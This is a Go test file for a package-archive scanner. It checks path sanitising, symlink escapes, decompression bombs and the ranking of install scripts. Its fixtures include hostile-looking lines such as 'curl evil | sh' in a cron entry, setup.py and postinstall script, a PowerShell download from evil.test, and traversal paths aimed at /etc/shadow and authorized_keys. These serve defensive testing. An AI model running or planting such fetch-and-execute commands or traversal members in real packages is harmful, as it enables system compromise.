package llmpkgscan

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"errors"
	"fmt"
	"math/rand"
	"strings"
	"testing"
	"unicode/utf16"

	"github.com/blechschmidt/pullthrough-security/internal/llmpkgscan/pkgscantest"
)

func mustTree(t *testing.T, artifact []byte, lim Limits) *Tree {
	t.Helper()
	tree, err := buildTree(context.Background(), bytes.NewReader(artifact), lim.withDefaults())
	if err != nil {
		t.Fatalf("buildTree: %v", err)
	}
	return tree
}

// tarMember is one member of a hand-built tarball.
type tarMember struct {
	name     string
	typeflag byte
	data     string
	linkname string
}

func tarGzMembers(t *testing.T, members []tarMember) []byte {
	t.Helper()
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gw)
	for _, m := range members {
		flag := m.typeflag
		if flag == 0 {
			flag = tar.TypeReg
		}
		if err := tw.WriteHeader(&tar.Header{Name: m.name, Mode: 0o644, Typeflag: flag, Linkname: m.linkname, Size: int64(len(m.data))}); err != nil {
			t.Fatalf("tar header %q: %v", m.name, err)
		}
		if _, err := tw.Write([]byte(m.data)); err != nil {
			t.Fatal(err)
		}
	}
	tw.Close()
	gw.Close()
	return buf.Bytes()
}

func TestSafePath(t *testing.T) {
	cases := []struct {
		in     string
		want   string
		unsafe bool
	}{
		{"package/index.js", "package/index.js", false},
		{"./package//lib/./a.js", "package/lib/a.js", false},
		{"../../etc/passwd", "etc/passwd", true},
		{"package/../../../root/.ssh/authorized_keys", "package/root/.ssh/authorized_keys", true},
		{"/etc/cron.d/evil", "etc/cron.d/evil", true},
		{`C:\Windows\System32\evil.dll`, "Windows/System32/evil.dll", true},
		{`..\..\escape.txt`, "escape.txt", true},
		{"a/b/..", "a/b", true},
		{"", "_unnamed", false},
		{"/", "_unnamed", true},
		{"..", "_unnamed", true},
		{"pkg/na\x00me\n.js", "pkg/na?me?.js", false},
		{"pkg/\u202Egpj.exe", "pkg/?gpj.exe", false}, // right-to-left override in a name
		{"pkg/zero\u200Bwidth.js", "pkg/zero?width.js", false},
	}
	for _, tc := range cases {
		got, unsafe := safePath(tc.in)
		if got != tc.want || unsafe != tc.unsafe {
			t.Errorf("safePath(%q) = (%q, %v), want (%q, %v)", tc.in, got, unsafe, tc.want, tc.unsafe)
		}
		// The invariant that matters: the result can never climb or be absolute.
		if strings.HasPrefix(got, "/") || strings.Contains("/"+got+"/", "/../") || strings.ContainsAny(got, "\\\x00\n") {
			t.Errorf("safePath(%q) = %q is not a plain relative path", tc.in, got)
		}
	}

	// An over-long name is bounded, and two long names that differ only in the
	// middle still get different keys.
	a := "pkg/" + strings.Repeat("a", 600) + "/x.js"
	b := "pkg/" + strings.Repeat("a", 300) + "b" + strings.Repeat("a", 299) + "/x.js"
	ca, _ := safePath(a)
	cb, _ := safePath(b)
	if len(ca) > maxPathBytes || len(cb) > maxPathBytes || ca == cb {
		t.Errorf("long names: len %d / %d, equal %v", len(ca), len(cb), ca == cb)
	}
}

func TestTreeRecordsTraversalAndEscapingLinksAsAnomalies(t *testing.T) {
	artifact := tarGzMembers(t, []tarMember{
		{name: "package/index.js", data: "module.exports = 1;\n"},
		{name: "package/../../../etc/cron.d/evil", data: "* * * * * root curl evil | sh\n"},
		{name: "/abs/file", data: "x\n"},
		{name: "package/innocent-link", typeflag: tar.TypeSymlink, linkname: "lib/real.js"},
		{name: "package/escape-link", typeflag: tar.TypeSymlink, linkname: "../../../../etc/passwd"},
		{name: "package/abs-link", typeflag: tar.TypeSymlink, linkname: "/etc/shadow"},
		{name: "package/hard", typeflag: tar.TypeLink, linkname: "/etc/hosts"},
	})
	tree := mustTree(t, artifact, Limits{})

	// The traversal members are kept — under keys that cannot escape — so the
	// model can read what they would have dropped onto the host.
	for _, p := range []string{"package/index.js", "etc/cron.d/evil", "abs/file"} {
		if _, ok := tree.Lookup(p); !ok {
			t.Errorf("member %q missing from the tree", p)
		}
	}
	for _, f := range tree.Files {
		if strings.HasPrefix(f.Path, "/") || strings.Contains(f.Path, "..") {
			t.Errorf("tree key %q is not a safe relative path", f.Path)
		}
	}
	if tree.StrongAnomalies != 5 {
		t.Errorf("strong anomalies = %d, want 5 (2 traversal names + 3 escaping links): %v", tree.StrongAnomalies, tree.Anomalies)
	}
	joined := strings.Join(tree.Anomalies, "\n")
	for _, want := range []string{"escapes the package root", "symbolic link", "hard link", `"/etc/shadow"`} {
		if !strings.Contains(joined, want) {
			t.Errorf("anomalies lack %q:\n%s", want, joined)
		}
	}
	if len(tree.Links) != 4 {
		t.Fatalf("links = %+v", tree.Links)
	}
	for _, l := range tree.Links {
		wantEscape := l.Path != "package/innocent-link"
		if l.Escapes != wantEscape {
			t.Errorf("link %q -> %q: escapes = %v, want %v", l.Path, l.Target, l.Escapes, wantEscape)
		}
	}
}

func TestLinkEscapes(t *testing.T) {
	for _, tc := range []struct {
		path, target string
		want         bool
	}{
		{"pkg/a/link", "../b/file", false},
		{"pkg/a/link", "../../file", false}, // resolves to the package root: still inside
		{"pkg/a/link", "../../../file", true},
		{"pkg/link", "sub/../other", false},
		{"link", "..", true},
		{"pkg/link", "/etc/passwd", true},
		{"pkg/link", `C:\Windows`, true},
		{"pkg/link", `..\..\x`, true},
		{"pkg/link", "", false},
	} {
		if got := linkEscapes(tc.path, tc.target); got != tc.want {
			t.Errorf("linkEscapes(%q, %q) = %v, want %v", tc.path, tc.target, got, tc.want)
		}
	}
}

func TestTreeLookupCannotReachOutsideTheTree(t *testing.T) {
	tree := mustTree(t, pkgscantest.TarGz(map[string]string{"package/index.js": "x\n"}), Limits{})
	for _, p := range []string{"package/index.js", "./package/index.js", "/package/index.js", `package\index.js`, "package//index.js"} {
		if f, ok := tree.Lookup(p); !ok || f.Path != "package/index.js" {
			t.Errorf("Lookup(%q) = %v, %v", p, f, ok)
		}
	}
	// ".." is never resolved, only discarded — so it cannot be used to walk
	// anywhere, not even back to a file that exists.
	for _, p := range []string{"/etc/passwd", "../../etc/passwd", "package/../../etc/passwd", "package/../package/index.js",
		"/proc/self/environ", "C:\\Windows\\win.ini", "", "package"} {
		if _, ok := tree.Lookup(p); ok {
			t.Errorf("Lookup(%q) resolved to a file; nothing outside the tree may", p)
		}
	}
}

func TestTreeDigestIsOfTheBytesUnpacked(t *testing.T) {
	artifact := benignPackage()
	tree := mustTree(t, artifact, Limits{})
	if "sha256:"+tree.Digest != pkgscantest.Digest(artifact) {
		t.Errorf("digest = %s, want %s", tree.Digest, pkgscantest.Digest(artifact))
	}
	if tree.ArtifactBytes != int64(len(artifact)) {
		t.Errorf("artifact bytes = %d, want %d", tree.ArtifactBytes, len(artifact))
	}
	// Trailing bytes after the archive are part of the artifact and of its digest.
	padded := append(append([]byte{}, artifact...), bytes.Repeat([]byte{0}, 4096)...)
	tree = mustTree(t, padded, Limits{})
	if "sha256:"+tree.Digest != pkgscantest.Digest(padded) || tree.ArtifactBytes != int64(len(padded)) {
		t.Errorf("padded artifact: digest/size do not cover the whole stream")
	}
}

func TestTreeTextAndBinaryClassification(t *testing.T) {
	utf16LE := func(s string) string {
		u := utf16.Encode([]rune(s))
		b := []byte{0xFF, 0xFE}
		for _, c := range u {
			b = append(b, byte(c), byte(c>>8))
		}
		return string(b)
	}
	artifact := pkgscantest.TarGz(map[string]string{
		"pkg/code.js":        "const a = 1;\nconst b = 2;\n",
		"pkg/bom.txt":        "\xEF\xBB\xBFfirst line\n",
		"pkg/install.ps1":    utf16LE("Invoke-WebRequest http://evil.test/x -OutFile x.exe\r\n"),
		"pkg/native.node":    "\x7fELF\x02\x01\x01\x00" + strings.Repeat("\x00\x01\x02", 100),
		"pkg/lib.dll":        "MZ\x90\x00" + strings.Repeat("\x00", 200),
		"pkg/mod.wasm":       "\x00asm\x01\x00\x00\x00",
		"pkg/cache.pyc":      "\xcb\x0d\r\n" + strings.Repeat("\x00\x05", 50),
		"pkg/blob.bin":       strings.Repeat("\x00\xff\x10\x80", 64),
		"pkg/empty.txt":      "",
		"pkg/unicode.md":     "héllo wörld — ünïcode ✓\n",
		"pkg/control.dat":    strings.Repeat("\x01\x02\x03\x04abc", 40),
		"pkg/no-newline.txt": "one line without a terminator",
	})
	tree := mustTree(t, artifact, Limits{})

	text := map[string]int{"pkg/code.js": 2, "pkg/bom.txt": 1, "pkg/install.ps1": 1, "pkg/empty.txt": 0, "pkg/unicode.md": 1, "pkg/no-newline.txt": 1}
	for p, lines := range text {
		f, ok := tree.Lookup(p)
		if !ok || f.Binary || f.Lines != lines {
			t.Errorf("%s: binary=%v lines=%d, want text with %d lines", p, f != nil && f.Binary, f.Lines, lines)
		}
	}
	// A UTF-16 PowerShell script is decoded, not dismissed as binary: otherwise
	// an install script could hide from the review by its encoding alone.
	ps, _ := tree.Lookup("pkg/install.ps1")
	if !strings.Contains(string(ps.Data), "Invoke-WebRequest http://evil.test/x") {
		t.Errorf("UTF-16 script not decoded: %q", ps.Data)
	}
	if bom, _ := tree.Lookup("pkg/bom.txt"); string(bom.line(1)) != "first line" {
		t.Errorf("UTF-8 BOM not stripped: %q", bom.line(1))
	}

	binary := map[string]string{
		"pkg/native.node": "ELF",
		"pkg/lib.dll":     "Windows PE",
		"pkg/mod.wasm":    "WebAssembly",
		"pkg/cache.pyc":   "Python bytecode",
		"pkg/blob.bin":    "binary data",
		"pkg/control.dat": "binary data",
	}
	for p, kind := range binary {
		f, ok := tree.Lookup(p)
		if !ok || !f.Binary || !strings.Contains(f.Kind, kind) {
			t.Errorf("%s: binary=%v kind=%q, want binary %q", p, f != nil && f.Binary, f.Kind, kind)
			continue
		}
		if f.Data != nil || f.Readable() {
			t.Errorf("%s: binary content must not be retained", p)
		}
	}
}

func TestTreeLimitsAreStatedNotSilent(t *testing.T) {
	files := map[string]string{}
	for i := 0; i < 30; i++ {
		files[fmt.Sprintf("pkg/f%02d.js", i)] = "x\n"
	}
	tree := mustTree(t, pkgscantest.TarGz(files), Limits{MaxFiles: 10})
	if len(tree.Files) != 10 || !tree.Truncated() {
		t.Fatalf("files = %d truncated = %v, want 10 and truncated", len(tree.Files), tree.Truncated())
	}
	if !strings.Contains(strings.Join(tree.Notes, " "), "NOT unpacked") {
		t.Errorf("the file-count limit is not stated: %v", tree.Notes)
	}

	// The per-file cap.
	big := strings.Repeat("line of text\n", 1000)
	tree = mustTree(t, pkgscantest.TarGz(map[string]string{"pkg/big.js": big, "pkg/small.js": "x\n"}), Limits{MaxFileBytes: 1024})
	f, _ := tree.Lookup("pkg/big.js")
	if !f.Truncated || len(f.Data) != 1024 || f.Size != int64(len(big)) {
		t.Errorf("big file: truncated=%v kept=%d size=%d", f.Truncated, len(f.Data), f.Size)
	}
	if !strings.Contains(strings.Join(tree.Notes, " "), "per-file limit of 1024 bytes") {
		t.Errorf("the per-file limit is not stated: %v", tree.Notes)
	}

	// Depth.
	deep := "pkg/" + strings.Repeat("d/", 12) + "deep.js"
	tree = mustTree(t, pkgscantest.TarGz(map[string]string{deep: "x\n", "pkg/top.js": "y\n"}), Limits{MaxDepth: 6})
	if _, ok := tree.Lookup(deep); ok {
		t.Error("a member deeper than maxDepth was kept")
	}
	if !strings.Contains(strings.Join(tree.Notes, " "), "nested deeper than 6 directories") {
		t.Errorf("the depth limit is not stated: %v", tree.Notes)
	}

	// A complete tree says nothing.
	if tree := mustTree(t, benignPackage(), Limits{}); tree.Truncated() || len(tree.Anomalies) != 0 {
		t.Errorf("a complete, ordinary package: notes %v anomalies %v", tree.Notes, tree.Anomalies)
	}
}

func TestTreeDecompressionBombIsStoppedAndFlagged(t *testing.T) {
	bomb := tarGzMembers(t, []tarMember{
		{name: "pkg/index.js", data: "module.exports = 1;\n"},
		{name: "pkg/zeros.bin", data: string(make([]byte, 24<<20))},
		{name: "pkg/after.js", data: "never reached\n"},
	})
	tree := mustTree(t, bomb, Limits{MaxCompressionRatio: 50})
	if _, ok := tree.Lookup("pkg/after.js"); ok {
		t.Error("unpacking continued past the bomb")
	}
	if tree.StrongAnomalies == 0 || !strings.Contains(strings.Join(tree.Anomalies, " "), "decompression bomb") {
		t.Errorf("the bomb is not an anomaly: %v", tree.Anomalies)
	}
	if !tree.Truncated() {
		t.Error("a tree cut short by the ratio guard must be marked truncated")
	}
}

func TestTreeErrors(t *testing.T) {
	lim := DefaultLimits()
	for name, tc := range map[string]struct {
		artifact []byte
		lim      Limits
		want     error
	}{
		"oversized": {pkgscantest.TarGz(map[string]string{"pkg/blob.txt": incompressible(4000)}), Limits{MaxArtifactBytes: 1000}, errOversized},
		// No archive signature at all: a document, not a package.
		"not archive (binary)": {[]byte{0xde, 0xad, 0xbe, 0xef, 0x01, 0x02, 0x03, 0x04, 0x05}, lim, errNotArchive},
		"not archive (text)":   {[]byte("Metadata-Version: 2.1\nName: demo\nVersion: 1.0.0\n"), lim, errNotArchive},
		"not archive (large)":  {bytes.Repeat([]byte("a"), 2000), Limits{MaxArtifactBytes: 1000}, errNotArchive},
		// Starts like an archive but cannot be unpacked: a package that went
		// unexamined, which is a different thing.
		"corrupt gzip":        {append([]byte{0x1f, 0x8b, 0x08, 0x00}, bytes.Repeat([]byte{0x55}, 64)...), lim, errUnsupported},
		"zstd (not unpacked)": {append([]byte{0x28, 0xb5, 0x2f, 0xfd}, bytes.Repeat([]byte{0x01}, 64)...), lim, errUnsupported},
		"xz (not unpacked)":   {append([]byte{0xfd, '7', 'z', 'X', 'Z', 0x00}, bytes.Repeat([]byte{0x01}, 64)...), lim, errUnsupported},
		"empty":               {pkgscantest.TarGz(nil), lim, errEmpty},
		"only too deep":       {pkgscantest.TarGz(map[string]string{"a/b/c/d/e/f.js": "x"}), Limits{MaxDepth: 2}, errUnpackLimit},
	} {
		_, err := buildTree(context.Background(), bytes.NewReader(tc.artifact), tc.lim.withDefaults())
		if !errors.Is(err, tc.want) {
			t.Errorf("%s: err = %v, want %v", name, err, tc.want)
		}
	}

	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if _, err := buildTree(ctx, bytes.NewReader(benignPackage()), lim); !errors.Is(err, context.Canceled) {
		t.Errorf("canceled: err = %v", err)
	}
}

// incompressible returns n bytes of printable text gzip cannot shrink much.
func incompressible(n int) string {
	const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/"
	rng := rand.New(rand.NewSource(7))
	b := make([]byte, n)
	for i := range b {
		b[i] = alphabet[rng.Intn(len(alphabet))]
	}
	return string(b)
}

func TestArchiveMagic(t *testing.T) {
	tarHead := make([]byte, 512)
	copy(tarHead, "package/package.json")
	copy(tarHead[257:], "ustar\x0000")
	for name, tc := range map[string]struct {
		head []byte
		want bool
	}{
		"gzip":            {[]byte{0x1f, 0x8b, 0x08}, true},
		"zip":             {[]byte("PK\x03\x04rest"), true},
		"empty zip":       {[]byte("PK\x05\x06"), true},
		"bzip2":           {[]byte("BZh91AY"), true},
		"xz":              {[]byte{0xfd, '7', 'z', 'X', 'Z', 0x00}, true},
		"zstd":            {[]byte{0x28, 0xb5, 0x2f, 0xfd, 0x00}, true},
		"zstd skippable":  {[]byte{0x5a, 0x2a, 0x4d, 0x18, 0x00}, true},
		"7z":              {[]byte{'7', 'z', 0xbc, 0xaf, 0x27, 0x1c}, true},
		"ar":              {[]byte("!<arch>\ndebian-binary"), true},
		"tar":             {tarHead, true},
		"wheel metadata":  {[]byte("Metadata-Version: 2.1\n"), false},
		"nuspec":          {[]byte("<?xml version=\"1.0\"?><package>"), false},
		"json":            {[]byte(`{"name":"demo"}`), false},
		"zlib gemspec":    {[]byte{0x78, 0x9c, 0x01, 0x02}, false},
		"short":           {[]byte{0x1f}, false},
		"nothing":         {nil, false},
		"ustar elsewhere": {[]byte("ustar is a word in this text file"), false},
	} {
		if got := archiveMagic(tc.head); got != tc.want {
			t.Errorf("%s: archiveMagic = %v, want %v", name, got, tc.want)
		}
	}
}

func TestClaimsArchive(t *testing.T) {
	for name, want := range map[string]bool{
		"demo-1.0.0.tgz":                       true,
		"demo-1.0.0.tar.gz":                    true,
		"Demo-1.0.0-py3-none-any.WHL":          true,
		"demo-1.0.0.gem":                       true,
		"demo.1.0.0.nupkg":                     true,
		"demo-1.0.0.crate":                     true,
		"demo-1.0.0.tar.zst":                   true,
		"demo-1.0.0-py3-none-any.whl.metadata": false,
		"demo.nuspec":                          false,
		"demo-1.0.0.gemspec.rz":                false,
		"download":                             false,
		"":                                     false,
		"demo-1.0.0.tgz.sig":                   false,
		"demo-1.0.0-py3-none-any.whl.asc":      false,
		"demo-1.0.0.tar.gz.provenance":         false,
		"demo-1.0.0-py3-none-any.whl.publish.attestation": false,
	} {
		if got := claimsArchive(name); got != want {
			t.Errorf("claimsArchive(%q) = %v, want %v", name, got, want)
		}
	}
}

func TestTreeKeepsDuplicateMembersApart(t *testing.T) {
	artifact := tarGzMembers(t, []tarMember{
		{name: "pkg/setup.py", data: "print('benign')\n"},
		{name: "pkg/setup.py", data: "import os; os.system('curl evil | sh')\n"},
	})
	tree := mustTree(t, artifact, Limits{})
	if len(tree.Files) != 2 {
		t.Fatalf("files = %d, want both members kept", len(tree.Files))
	}
	var contents []string
	for _, f := range tree.Files {
		contents = append(contents, string(f.Data))
	}
	joined := strings.Join(contents, "|")
	if !strings.Contains(joined, "benign") || !strings.Contains(joined, "os.system") {
		t.Errorf("a duplicate member's content was lost: %q", joined)
	}
	if !strings.Contains(strings.Join(tree.Anomalies, " "), "more than one member named") {
		t.Errorf("duplicates are not reported: %v", tree.Anomalies)
	}
}

func TestRankingPutsWhatRunsAutomaticallyFirst(t *testing.T) {
	artifact := pkgscantest.NpmTarball("demo", "1.0.0",
		map[string]string{"postinstall": "node ./scripts/fetch.js && echo done"},
		map[string]string{
			"index.js":                  "module.exports = require('./lib/core');\n",
			"lib/core.js":               "exports.add = (a, b) => a + b;\n",
			"scripts/fetch.js":          "require('child_process').execSync('curl http://x | sh');\n",
			"scripts/unrelated.js":      "console.log('dev helper');\n",
			"README.md":                 "# demo\n" + strings.Repeat("docs ", 400) + "\n",
			"LICENSE":                   "MIT\n",
			"test/core.test.js":         "require('child_process'); // test helper\n",
			"node_modules/dep/index.js": "module.exports = 2;\n",
			"dist/bundle.min.js":        "!function(){var a=1}();\n",
		})
	tree := mustTree(t, artifact, Limits{})
	order := map[string]int{}
	for i, f := range tree.byPriority() {
		order[f.Path] = i
	}
	before := func(a, b string) {
		t.Helper()
		if order[a] >= order[b] {
			t.Errorf("%q (rank %d) should come before %q (rank %d)", a, order[a], b, order[b])
		}
	}
	before("package/scripts/fetch.js", "package/index.js")
	before("package/package.json", "package/index.js")
	before("package/index.js", "package/lib/core.js")
	before("package/lib/core.js", "package/README.md")
	before("package/scripts/fetch.js", "package/scripts/unrelated.js")
	before("package/lib/core.js", "package/node_modules/dep/index.js")
	before("package/lib/core.js", "package/dist/bundle.min.js")

	fetch, _ := tree.Lookup("package/scripts/fetch.js")
	if !strings.Contains(fetch.Role, "postinstall") {
		t.Errorf("the lifecycle-referenced script's role = %q", fetch.Role)
	}
	if got := strings.Join(fetch.Signals, ","); !strings.Contains(got, "exec") || !strings.Contains(got, "network") {
		t.Errorf("signals = %q, want exec and network", got)
	}
	// An entry point is not mistaken for something that runs at install.
	if idx, _ := tree.Lookup("package/index.js"); idx.Score >= scoreAutoExec || !strings.Contains(idx.Role, "entry point") {
		t.Errorf("index.js: score %d role %q", idx.Score, idx.Role)
	}
}

func TestBaseScoreByEcosystemConvention(t *testing.T) {
	// Each ecosystem's auto-executed files outrank ordinary source.
	auto := []string{
		"pkg-1.0/setup.py", "pkg/evil.pth", "crate-0.1.0/build.rs", "ext/native/extconf.rb",
		"tools/install.ps1", "build/Pkg.targets", "package/package.json", "composer.json",
		"pkg/sitecustomize.py", "package/postinstall.js", "package/scripts/post-install.sh",
	}
	ordinary := []string{"pkg/util.py", "src/helpers.rs", "lib/thing.rb", "package/lib/a.js", "package/installer-ui.js", "package/setupTests.js"}
	for _, a := range auto {
		sa, _ := baseScore(a)
		for _, o := range ordinary {
			if so, _ := baseScore(o); sa <= so {
				t.Errorf("%q (score %d) should outrank %q (score %d)", a, sa, o, so)
			}
		}
	}
	// A manifest buried in a vendored tree is not the package's own.
	top, _ := baseScore("package/package.json")
	vendored, _ := baseScore("package/node_modules/a/node_modules/b/package.json")
	if vendored >= top {
		t.Errorf("vendored manifest score %d should be below the package's own %d", vendored, top)
	}
}

func TestFileLineIndex(t *testing.T) {
	f := &File{Data: []byte("alpha\nbeta\r\n\ngamma")}
	f.indexLines()
	if f.Lines != 4 {
		t.Fatalf("lines = %d, want 4", f.Lines)
	}
	for n, want := range map[int]string{1: "alpha", 2: "beta", 3: "", 4: "gamma"} {
		if got := string(f.line(n)); got != want {
			t.Errorf("line %d = %q, want %q", n, got, want)
		}
	}
	if f.line(0) != nil || f.line(5) != nil {
		t.Error("out-of-range lines must be nil")
	}
	for off, want := range map[int]int{0: 1, 5: 1, 6: 2, 11: 2, 12: 3, 13: 4, 17: 4} {
		if got := f.lineAt(off); got != want {
			t.Errorf("lineAt(%d) = %d, want %d", off, got, want)
		}
	}
	// A trailing newline does not create a phantom last line.
	g := &File{Data: []byte("one\ntwo\n")}
	g.indexLines()
	if g.Lines != 2 {
		t.Errorf("lines = %d, want 2", g.Lines)
	}
}
